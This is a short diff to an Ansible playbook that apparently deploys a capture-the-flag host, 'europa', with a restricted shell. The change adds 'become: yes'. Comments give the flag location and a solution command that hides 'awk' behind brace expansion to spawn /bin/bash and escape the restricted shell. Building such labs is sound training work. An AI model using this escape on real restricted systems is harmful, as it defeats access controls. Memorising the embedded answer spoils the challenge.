@@ -2,6 +2,7 @@
 # Flag location /flag.txt, reachable after breaking out of lshell
 # solution command: eval a{v..x}k\ \'BEGIN\ {system\(\"/bin/bash\"\)}\'\;
 - hosts: europa
+  become: yes
   tasks:
       - ping:
       - import_tasks: roles/europa/tasks/deploy_rbash.yml
